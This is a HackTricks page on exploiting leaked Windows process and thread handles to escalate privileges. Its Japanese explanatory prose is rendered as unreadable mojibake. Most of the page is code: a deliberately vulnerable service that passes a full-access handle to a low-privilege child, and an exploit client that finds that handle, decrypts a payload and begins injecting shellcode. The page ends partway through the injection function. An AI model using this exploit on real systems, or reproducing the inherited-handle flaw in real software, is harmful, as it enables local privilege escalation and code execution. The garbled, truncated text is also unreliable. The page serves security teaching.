# Leaked Handle Exploitation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Introduction

ãƒ—ãƒ­ã‚»ã‚¹å†…ã®ãƒãƒ³ãƒ‰ãƒ«ã¯ã€ç•°ãªã‚‹**Windowsãƒªã‚½ãƒ¼ã‚¹**ã«**ã‚¢ã‚¯ã‚»ã‚¹**ã™ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™ï¼š

![RootedCON2022 - Exploiting Leaked Handles for LPE](<../../.gitbook/assets/image (246).png>)

ã™ã§ã«ã„ãã¤ã‹ã®**ç‰¹æ¨©æ˜‡æ ¼**ã®ã‚±ãƒ¼ã‚¹ãŒã‚ã‚Šã€**ã‚ªãƒ¼ãƒ—ãƒ³ã§ç¶™æ‰¿å¯èƒ½ãªãƒãƒ³ãƒ‰ãƒ«**ã‚’æŒã¤**ç‰¹æ¨©ãƒ—ãƒ­ã‚»ã‚¹**ãŒ**ç‰¹æ¨©ã®ãªã„ãƒ—ãƒ­ã‚»ã‚¹**ã‚’**å®Ÿè¡Œ**ã—ã€ãã®**ã™ã¹ã¦ã®ãƒãƒ³ãƒ‰ãƒ«ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹**ã‚’ä¸ãˆã¦ã„ã¾ã™ã€‚

ä¾‹ãˆã°ã€**SYSTEMã¨ã—ã¦å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ãƒ—ãƒ­ã‚»ã‚¹ãŒæ–°ã—ã„ãƒ—ãƒ­ã‚»ã‚¹ã‚’é–‹ã**ï¼ˆ`OpenProcess()`ï¼‰ã¨ã€**ãƒ•ãƒ«ã‚¢ã‚¯ã‚»ã‚¹**ã‚’æŒã¤å ´åˆã‚’æƒ³åƒã—ã¦ãã ã•ã„ã€‚åŒã˜ãƒ—ãƒ­ã‚»ã‚¹ãŒ**ä½ç‰¹æ¨©ã®æ–°ã—ã„ãƒ—ãƒ­ã‚»ã‚¹ã‚’ä½œæˆ**ï¼ˆ`CreateProcess()`ï¼‰ã—ã€**ãƒ¡ã‚¤ãƒ³ãƒ—ãƒ­ã‚»ã‚¹ã®ã™ã¹ã¦ã®ã‚ªãƒ¼ãƒ—ãƒ³ãƒãƒ³ãƒ‰ãƒ«ã‚’ç¶™æ‰¿**ã—ã¾ã™ã€‚\
ãã®å¾Œã€**ä½ç‰¹æ¨©ãƒ—ãƒ­ã‚»ã‚¹ã«ãƒ•ãƒ«ã‚¢ã‚¯ã‚»ã‚¹**ãŒã‚ã‚Œã°ã€`OpenProcess()`ã§ä½œæˆã•ã‚ŒãŸ**ç‰¹æ¨©ãƒ—ãƒ­ã‚»ã‚¹ã¸ã®ã‚ªãƒ¼ãƒ—ãƒ³ãƒãƒ³ãƒ‰ãƒ«ã‚’å–å¾—**ã—ã€**ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’æ³¨å…¥**ã§ãã¾ã™ã€‚

## **Interesting Handles**

### **Process**

æœ€åˆã®ä¾‹ã§èª­ã‚“ã ã‚ˆã†ã«ã€**ç‰¹æ¨©ã®ãªã„ãƒ—ãƒ­ã‚»ã‚¹ãŒç‰¹æ¨©ãƒ—ãƒ­ã‚»ã‚¹ã®ãƒ—ãƒ­ã‚»ã‚¹ãƒãƒ³ãƒ‰ãƒ«ã‚’ç¶™æ‰¿**ã™ã‚‹ã¨ã€ååˆ†ãªæ¨©é™ãŒã‚ã‚Œã°**ä»»æ„ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œ**ã§ãã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚

[**ã“ã®å„ªã‚ŒãŸè¨˜äº‹**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)ã§ã¯ã€æ¬¡ã®ã„ãšã‚Œã‹ã®æ¨©é™ã‚’æŒã¤ãƒ—ãƒ­ã‚»ã‚¹ãƒãƒ³ãƒ‰ãƒ«ã‚’ã©ã®ã‚ˆã†ã«æ‚ªç”¨ã™ã‚‹ã‹ã‚’è¦‹ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

* PROCESS\_ALL\_ACCESS
* PROCESS\_CREATE\_PROCESS
* PROCESS\_CREATE\_THREAD
* PROCESS\_DUP\_HANDLE
* PROCESS\_VM\_WRITE

### Thread

ãƒ—ãƒ­ã‚»ã‚¹ãƒãƒ³ãƒ‰ãƒ«ã¨åŒæ§˜ã«ã€**ç‰¹æ¨©ã®ãªã„ãƒ—ãƒ­ã‚»ã‚¹ãŒç‰¹æ¨©ãƒ—ãƒ­ã‚»ã‚¹ã®ã‚¹ãƒ¬ãƒƒãƒ‰ãƒãƒ³ãƒ‰ãƒ«ã‚’ç¶™æ‰¿**ã™ã‚‹ã¨ã€ååˆ†ãªæ¨©é™ãŒã‚ã‚Œã°**ä»»æ„ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œ**ã§ãã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚

[**ã“ã®å„ªã‚ŒãŸè¨˜äº‹**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)ã§ã¯ã€æ¬¡ã®ã„ãšã‚Œã‹ã®æ¨©é™ã‚’æŒã¤ãƒ—ãƒ­ã‚»ã‚¹ãƒãƒ³ãƒ‰ãƒ«ã‚’ã©ã®ã‚ˆã†ã«æ‚ªç”¨ã™ã‚‹ã‹ã‚‚è¦‹ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

* THREAD\_ALL\_ACCESS
* THREAD\_DIRECT\_IMPERSONATION
* THREAD\_SET\_CONTEXT

### File, Key & Section Handles

**ç‰¹æ¨©ã®ãªã„ãƒ—ãƒ­ã‚»ã‚¹ãŒ**ç‰¹æ¨©ãƒ•ã‚¡ã‚¤ãƒ«ã‚„ãƒ¬ã‚¸ã‚¹ãƒˆãƒªã«å¯¾ã—ã¦**æ›¸ãè¾¼ã¿**ã«ç›¸å½“ã™ã‚‹**æ¨©é™**ã‚’æŒã¤**ãƒãƒ³ãƒ‰ãƒ«ã‚’ç¶™æ‰¿**ã™ã‚‹ã¨ã€ãã®ãƒ•ã‚¡ã‚¤ãƒ«/ãƒ¬ã‚¸ã‚¹ãƒˆãƒªã‚’**ä¸Šæ›¸ã**ã§ãã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ï¼ˆãã—ã¦å¤šãã®**é‹ãŒã‚ã‚Œã°ã€ç‰¹æ¨©ã‚’æ˜‡æ ¼**ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼‰ã€‚

**ã‚»ã‚¯ã‚·ãƒ§ãƒ³ãƒãƒ³ãƒ‰ãƒ«**ã¯ãƒ•ã‚¡ã‚¤ãƒ«ãƒãƒ³ãƒ‰ãƒ«ã«ä¼¼ã¦ãŠã‚Šã€ã“ã®ç¨®ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ä¸€èˆ¬çš„ãªåå‰ã¯**ã€Œãƒ•ã‚¡ã‚¤ãƒ«ãƒãƒƒãƒ”ãƒ³ã‚°ã€**ã§ã™ã€‚ã“ã‚Œã‚‰ã¯ã€**å¤§ããªãƒ•ã‚¡ã‚¤ãƒ«ã‚’ãƒ¡ãƒ¢ãƒªå…¨ä½“ã«ä¿æŒã›ãšã«ä½œæ¥­ã™ã‚‹**ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ãƒ•ã‚¡ã‚¤ãƒ«ãƒãƒ³ãƒ‰ãƒ«ã®æ‚ªç”¨ãŒã€Œé¡ä¼¼ã€ã™ã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚

## How to see handles of processes

### Process Hacker

[**Process Hacker**](https://github.com/processhacker/processhacker)ã¯ã€ç„¡æ–™ã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã§ãã‚‹ãƒ„ãƒ¼ãƒ«ã§ã™ã€‚ãƒ—ãƒ­ã‚»ã‚¹ã‚’æ¤œæŸ»ã™ã‚‹ãŸã‚ã®ç´ æ™´ã‚‰ã—ã„ã‚ªãƒ—ã‚·ãƒ§ãƒ³ãŒã„ãã¤ã‹ã‚ã‚Šã€ãã®1ã¤ã¯**å„ãƒ—ãƒ­ã‚»ã‚¹ã®ãƒãƒ³ãƒ‰ãƒ«ã‚’è¦‹ã‚‹èƒ½åŠ›**ã§ã™ã€‚

ã™ã¹ã¦ã®ãƒ—ãƒ­ã‚»ã‚¹ã®ã™ã¹ã¦ã®ãƒãƒ³ãƒ‰ãƒ«ã‚’è¦‹ã‚‹ã«ã¯ã€**SeDebugPrivilegeãŒå¿…è¦**ã§ã™ï¼ˆã—ãŸãŒã£ã¦ã€Process Hackerã‚’ç®¡ç†è€…ã¨ã—ã¦å®Ÿè¡Œã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼‰ã€‚

ãƒ—ãƒ­ã‚»ã‚¹ã®ãƒãƒ³ãƒ‰ãƒ«ã‚’è¦‹ã‚‹ã«ã¯ã€ãƒ—ãƒ­ã‚»ã‚¹ã‚’å³ã‚¯ãƒªãƒƒã‚¯ã—ã€ãƒãƒ³ãƒ‰ãƒ«ã‚’é¸æŠã—ã¾ã™ï¼š

![](<../../.gitbook/assets/image (616).png>)

æ¬¡ã«ã€ãƒãƒ³ãƒ‰ãƒ«ã‚’å³ã‚¯ãƒªãƒƒã‚¯ã—ã¦**æ¨©é™ã‚’ç¢ºèª**ã§ãã¾ã™ï¼š

![](<../../.gitbook/assets/image (946).png>)

### Sysinternals Handles

Sysinternalsã®[**Handles**](https://docs.microsoft.com/en-us/sysinternals/downloads/handle)ãƒã‚¤ãƒŠãƒªã¯ã€ã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã§ãƒ—ãƒ­ã‚»ã‚¹ã”ã¨ã®ãƒãƒ³ãƒ‰ãƒ«ã‚’ãƒªã‚¹ãƒˆã—ã¾ã™ï¼š

![](<../../.gitbook/assets/image (720).png>)

### LeakedHandlesFinder

[**ã“ã®ãƒ„ãƒ¼ãƒ«**](https://github.com/lab52io/LeakedHandlesFinder)ã¯ã€æ¼æ´©ã—ãŸ**ãƒãƒ³ãƒ‰ãƒ«**ã‚’**ç›£è¦–**ã—ã€ç‰¹æ¨©ã‚’æ˜‡æ ¼ã•ã›ã‚‹ãŸã‚ã«ãã‚Œã‚‰ã‚’**è‡ªå‹•çš„ã«æ‚ªç”¨**ã™ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚

### Methodology

ãƒ—ãƒ­ã‚»ã‚¹ã®ãƒãƒ³ãƒ‰ãƒ«ã‚’è¦‹ã¤ã‘ã‚‹æ–¹æ³•ã‚’çŸ¥ã£ãŸã®ã§ã€æ¬¡ã«ç¢ºèªã™ã‚‹å¿…è¦ãŒã‚ã‚‹ã®ã¯ã€**ç‰¹æ¨©ã®ãªã„ãƒ—ãƒ­ã‚»ã‚¹ãŒç‰¹æ¨©ãƒãƒ³ãƒ‰ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦ã„ã‚‹ã‹ã©ã†ã‹**ã§ã™ã€‚ãã®å ´åˆã€ãƒ—ãƒ­ã‚»ã‚¹ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ãƒãƒ³ãƒ‰ãƒ«ã‚’å–å¾—ã—ã€ãã‚Œã‚’æ‚ªç”¨ã—ã¦ç‰¹æ¨©ã‚’æ˜‡æ ¼ã•ã›ã‚‹ã“ã¨ãŒã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚

{% hint style="warning" %}
ã™ã¹ã¦ã®ãƒãƒ³ãƒ‰ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã«ã¯SeDebugPrivilegeãŒå¿…è¦ã§ã‚ã‚‹ã“ã¨ãŒå‰è¿°ã•ã‚Œã¾ã—ãŸã€‚ã—ã‹ã—ã€**ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯è‡ªåˆ†ã®ãƒ—ãƒ­ã‚»ã‚¹ã®ãƒãƒ³ãƒ‰ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ãŒã§ãã‚‹**ãŸã‚ã€ãã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‹ã‚‰ç‰¹æ¨©ã‚’æ˜‡æ ¼ã•ã›ã‚‹ãŸã‚ã«ã€**é€šå¸¸ã®æ¨©é™ã§ãƒ„ãƒ¼ãƒ«ã‚’å®Ÿè¡Œã™ã‚‹**ã“ã¨ãŒå½¹ç«‹ã¤ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚
```bash
handle64.exe /a | findstr /r /i "process thread file key pid:"
```
{% endhint %}

## è„†å¼±ãªä¾‹

ä¾‹ãˆã°ã€ä»¥ä¸‹ã®ã‚³ãƒ¼ãƒ‰ã¯è„†å¼±ãª**Windowsã‚µãƒ¼ãƒ“ã‚¹**ã«å±ã—ã¾ã™ã€‚ã“ã®ã‚µãƒ¼ãƒ“ã‚¹ãƒã‚¤ãƒŠãƒªã®è„†å¼±ãªã‚³ãƒ¼ãƒ‰ã¯**`Exploit`**é–¢æ•°å†…ã«ã‚ã‚Šã¾ã™ã€‚ã“ã®é–¢æ•°ã¯**ãƒ•ãƒ«ã‚¢ã‚¯ã‚»ã‚¹ã®æ–°ã—ã„ãƒãƒ³ãƒ‰ãƒ«ãƒ—ãƒ­ã‚»ã‚¹ã‚’ä½œæˆã—å§‹ã‚ã¾ã™**ã€‚æ¬¡ã«ã€**ä½ç‰¹æ¨©ãƒ—ãƒ­ã‚»ã‚¹ã‚’ä½œæˆã—ã¦ã„ã¾ã™**ï¼ˆ_explorer.exe_ã®ä½ç‰¹æ¨©ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ã‚³ãƒ”ãƒ¼ã™ã‚‹ã“ã¨ã«ã‚ˆã£ã¦ï¼‰_C:\users\username\desktop\client.exe_ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚**è„†å¼±æ€§ã¯ã€`bInheritHandles`ã‚’`TRUE`ã¨ã—ã¦ä½ç‰¹æ¨©ãƒ—ãƒ­ã‚»ã‚¹ã‚’ä½œæˆã—ã¦ã„ã‚‹ã¨ã„ã†äº‹å®Ÿã«ã‚ã‚Šã¾ã™**ã€‚

ã—ãŸãŒã£ã¦ã€ã“ã®ä½ç‰¹æ¨©ãƒ—ãƒ­ã‚»ã‚¹ã¯æœ€åˆã«ä½œæˆã•ã‚ŒãŸé«˜ç‰¹æ¨©ãƒ—ãƒ­ã‚»ã‚¹ã®ãƒãƒ³ãƒ‰ãƒ«ã‚’å–å¾—ã—ã€ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’æ³¨å…¥ã—ã¦å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆæ¬¡ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã‚’å‚ç…§ï¼‰ã€‚
```c
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#pragma comment (lib, "advapi32")

TCHAR* serviceName = TEXT("HandleLeakSrv");
SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE serviceStatusHandle = 0;
HANDLE stopServiceEvent = 0;


//Find PID of a proces from its name
int FindTarget(const char *procname) {

HANDLE hProcSnap;
PROCESSENTRY32 pe32;
int pid = 0;

hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

pe32.dwSize = sizeof(PROCESSENTRY32);

if (!Process32First(hProcSnap, &pe32)) {
CloseHandle(hProcSnap);
return 0;
}

while (Process32Next(hProcSnap, &pe32)) {
if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
pid = pe32.th32ProcessID;
break;
}
}

CloseHandle(hProcSnap);

return pid;
}


int Exploit(void) {

STARTUPINFOA si;
PROCESS_INFORMATION pi;
int pid = 0;
HANDLE hUserToken;
HANDLE hUserProc;
HANDLE hProc;

// open a handle to itself (privileged process) - this gets leaked!
hProc = OpenProcess(PROCESS_ALL_ACCESS, TRUE, GetCurrentProcessId());

// get PID of user low privileged process
if ( pid = FindTarget("explorer.exe") )
hUserProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
else
return -1;

// extract low privilege token from a user's process
if (!OpenProcessToken(hUserProc, TOKEN_ALL_ACCESS, &hUserToken)) {
CloseHandle(hUserProc);
return -1;
}

// spawn a child process with low privs and leaked handle
ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&pi, sizeof(pi));
CreateProcessAsUserA(hUserToken, "C:\\users\\username\\Desktop\\client.exe",
NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

CloseHandle(hProc);
CloseHandle(hUserProc);
return 0;
}



void WINAPI ServiceControlHandler( DWORD controlCode ) {
switch ( controlCode ) {
case SERVICE_CONTROL_SHUTDOWN:
case SERVICE_CONTROL_STOP:
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

SetEvent( stopServiceEvent );
return;

case SERVICE_CONTROL_PAUSE:
break;

case SERVICE_CONTROL_CONTINUE:
break;

case SERVICE_CONTROL_INTERROGATE:
break;

default:
break;
}
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}

void WINAPI ServiceMain( DWORD argc, TCHAR* argv[] ) {
// initialise service status
serviceStatus.dwServiceType = SERVICE_WIN32;
serviceStatus.dwCurrentState = SERVICE_STOPPED;
serviceStatus.dwControlsAccepted = 0;
serviceStatus.dwWin32ExitCode = NO_ERROR;
serviceStatus.dwServiceSpecificExitCode = NO_ERROR;
serviceStatus.dwCheckPoint = 0;
serviceStatus.dwWaitHint = 0;

serviceStatusHandle = RegisterServiceCtrlHandler( serviceName, ServiceControlHandler );

if ( serviceStatusHandle ) {
// service is starting
serviceStatus.dwCurrentState = SERVICE_START_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do initialisation here
stopServiceEvent = CreateEvent( 0, FALSE, FALSE, 0 );

// running
serviceStatus.dwControlsAccepted |= (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_RUNNING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

Exploit();
WaitForSingleObject( stopServiceEvent, -1 );

// service was stopped
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do cleanup here
CloseHandle( stopServiceEvent );
stopServiceEvent = 0;

// service is now stopped
serviceStatus.dwControlsAccepted &= ~(SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_STOPPED;
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}
}


void InstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CREATE_SERVICE );

if ( serviceControlManager ) {
TCHAR path[ _MAX_PATH + 1 ];
if ( GetModuleFileName( 0, path, sizeof(path)/sizeof(path[0]) ) > 0 ) {
SC_HANDLE service = CreateService( serviceControlManager,
serviceName, serviceName,
SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, path,
0, 0, 0, 0, 0 );
if ( service )
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

void UninstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CONNECT );

if ( serviceControlManager ) {
SC_HANDLE service = OpenService( serviceControlManager,
serviceName, SERVICE_QUERY_STATUS | DELETE );
if ( service ) {
SERVICE_STATUS serviceStatus;
if ( QueryServiceStatus( service, &serviceStatus ) ) {
if ( serviceStatus.dwCurrentState == SERVICE_STOPPED )
DeleteService( service );
}
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

int _tmain( int argc, TCHAR* argv[] )
{
if ( argc > 1 && lstrcmpi( argv[1], TEXT("install") ) == 0 ) {
InstallService();
}
else if ( argc > 1 && lstrcmpi( argv[1], TEXT("uninstall") ) == 0 ) {
UninstallService();
}
else  {
SERVICE_TABLE_ENTRY serviceTable[] = {
{ serviceName, ServiceMain },
{ 0, 0 }
};

StartServiceCtrlDispatcher( serviceTable );
}

return 0;
}
```
### Exploit Example 1

{% hint style="info" %}
å®Ÿéš›ã®ã‚·ãƒŠãƒªã‚ªã§ã¯ã€è„†å¼±ãªã‚³ãƒ¼ãƒ‰ã«ã‚ˆã£ã¦å®Ÿè¡Œã•ã‚Œã‚‹ãƒã‚¤ãƒŠãƒªã‚’**åˆ¶å¾¡ã§ããªã„**å¯èƒ½æ€§ãŒé«˜ã„ã§ã™ï¼ˆã“ã®å ´åˆã¯_C:\users\username\desktop\client.exe_ï¼‰ã€‚ãŠãã‚‰ãã€**ãƒ—ãƒ­ã‚»ã‚¹ã‚’ä¾µå®³ã—ã€ç‰¹æ¨©ãƒ—ãƒ­ã‚»ã‚¹ã®è„†å¼±ãªãƒãƒ³ãƒ‰ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™**ã€‚
{% endhint %}

ã“ã®ä¾‹ã§ã¯ã€_C:\users\username\desktop\client.exe_ã®å¯èƒ½ãªã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã®ã‚³ãƒ¼ãƒ‰ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
ã“ã®ã‚³ãƒ¼ãƒ‰ã®æœ€ã‚‚èˆˆå‘³æ·±ã„éƒ¨åˆ†ã¯`GetVulnProcHandle`ã«ã‚ã‚Šã¾ã™ã€‚ã“ã®é–¢æ•°ã¯**ã™ã¹ã¦ã®ãƒãƒ³ãƒ‰ãƒ«ã‚’å–å¾—ã—å§‹ã‚**ã€æ¬¡ã«**ãã‚Œã‚‰ã®ã„ãšã‚Œã‹ãŒåŒã˜PIDã«å±ã—ã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã—**ã€ãƒãƒ³ãƒ‰ãƒ«ãŒ**ãƒ—ãƒ­ã‚»ã‚¹**ã«å±ã—ã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã—ã¾ã™ã€‚ã“ã‚Œã‚‰ã®è¦ä»¶ãŒã™ã¹ã¦æº€ãŸã•ã‚Œã‚‹ã¨ï¼ˆã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ãªã‚ªãƒ¼ãƒ—ãƒ³ãƒ—ãƒ­ã‚»ã‚¹ãƒãƒ³ãƒ‰ãƒ«ãŒè¦‹ã¤ã‹ã‚‹ã¨ï¼‰ã€**ãƒ—ãƒ­ã‚»ã‚¹ã®ãƒãƒ³ãƒ‰ãƒ«ã‚’æ‚ªç”¨ã—ã¦ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’æ³¨å…¥ã—å®Ÿè¡Œã—ã‚ˆã†ã¨ã—ã¾ã™**ã€‚\
ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã®æ³¨å…¥ã¯**`Inject`**é–¢æ•°å†…ã§è¡Œã‚ã‚Œã€ç‰¹æ¨©ãƒ—ãƒ­ã‚»ã‚¹å†…ã«ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’æ›¸ãè¾¼ã¿ã€åŒã˜ãƒ—ãƒ­ã‚»ã‚¹å†…ã«ã‚¹ãƒ¬ãƒƒãƒ‰ã‚’ä½œæˆã—ã¦ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚
```c
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <wincrypt.h>
#include <psapi.h>
#include <tchar.h>
#include <tlhelp32.h>
#include "client.h"
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#pragma comment (lib, "kernel32")


int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
HCRYPTPROV hProv;
HCRYPTHASH hHash;
HCRYPTKEY hKey;

if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
return -1;
}
if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
return -1;
}
if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
return -1;
}
if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
return -1;
}

if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &payload_len)){
return -1;
}

CryptReleaseContext(hProv, 0);
CryptDestroyHash(hHash);
CryptDestroyKey(hKey);

return 0;
}


HANDLE GetVulnProcHandle(void) {

ULONG handleInfoSize = 0x10000;
NTSTATUS status;
PSYSTEM_HANDLE_INFORMATION phHandleInfo = (PSYSTEM_HANDLE_INFORMATION) malloc(handleInfoSize);
HANDLE hProc = NULL;
POBJECT_TYPE_INFORMATION objectTypeInfo;
PVOID objectNameInfo;
UNICODE_STRING objectName;
ULONG returnLength;
HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
DWORD dwOwnPID = GetCurrentProcessId();

pNtQuerySystemInformation = GetProcAddress(hNtdll, "NtQuerySystemInformation");
pNtDuplicateObject = GetProcAddress(hNtdll, "NtDuplicateObject");
pNtQueryObject = GetProcAddress(hNtdll, "NtQueryObject");
pRtlEqualUnicodeString = GetProcAddress(hNtdll, "RtlEqualUnicodeString");
pRtlInitUnicodeString = GetProcAddress(hNtdll, "RtlInitUnicodeString");

printf("[+] Grabbing handles...");

while ((status = pNtQuerySystemInformation( SystemHandleInformation, phHandleInfo, handleInfoSize,
NULL )) == STATUS_INFO_LENGTH_MISMATCH)
phHandleInfo = (PSYSTEM_HANDLE_INFORMATION) realloc(phHandleInfo, handleInfoSize *= 2);

if (status != STATUS_SUCCESS)
{
printf("[!] NtQuerySystemInformation failed!\n");
return 0;
}

printf("done.\n[+] Fetched %d handles.\n", phHandleInfo->NumberOfHandles);

// iterate handles until we find the privileged process handle
for (int i = 0; i < phHandleInfo->NumberOfHandles; ++i)
{
SYSTEM_HANDLE_TABLE_ENTRY_INFO handle = phHandleInfo->Handles[i];

// Check if this handle belongs to our own process
if (handle.UniqueProcessId != dwOwnPID)
continue;

objectTypeInfo = (POBJECT_TYPE_INFORMATION) malloc(0x1000);
if (pNtQueryObject( (HANDLE) handle.HandleValue,
ObjectTypeInformation,
objectTypeInfo,
0x1000,
NULL ) != STATUS_SUCCESS)
continue;

// skip some objects to avoid getting stuck
// see: https://github.com/adamdriscoll/PoshInternals/issues/7
if (handle.GrantedAccess == 0x0012019f
&& handle.GrantedAccess != 0x00120189
&& handle.GrantedAccess != 0x120089
&& handle.GrantedAccess != 0x1A019F ) {
free(objectTypeInfo);
continue;
}

// get object name information
objectNameInfo = malloc(0x1000);
if (pNtQueryObject( (HANDLE) handle.HandleValue,
ObjectNameInformation,
objectNameInfo,
0x1000,
&returnLength ) != STATUS_SUCCESS) {

// adjust the size of a returned object and query again
objectNameInfo = realloc(objectNameInfo, returnLength);
if (pNtQueryObject( (HANDLE) handle.HandleValue,
ObjectNameInformation,
objectNameInfo,
returnLength,
NULL ) != STATUS_SUCCESS) {
free(objectTypeInfo);
free(objectNameInfo);
continue;
}
}

// check if we've got a process object
objectName = *(PUNICODE_STRING) objectNameInfo;
UNICODE_STRING pProcess;

pRtlInitUnicodeString(&pProcess, L"Process");
if (pRtlEqualUnicodeString(&objectTypeInfo->TypeName, &pProcess, TRUE)) {
printf("[+] Found process handle (%x)\n", handle.HandleValue);
hProc = (HANDLE) handle.HandleValue;
free(objectTypeInfo);
free(objectNameInfo);
break;
}
else
continue;

free(objectTypeInfo);
free(objectNameInfo);
}

return hProc;
}

int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

LPVOID pRemoteCode = NULL;
HANDLE hThread = NULL;
BOOL bStatus = FALSE;

pVirtualAllocEx = GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualAllocEx");
pWriteProcessMemory = GetProcAddress(GetModuleHandle("kernel32.dll"), "WriteProcessMemory");
pRtlCreateUserThread = GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlCreateUserThread");

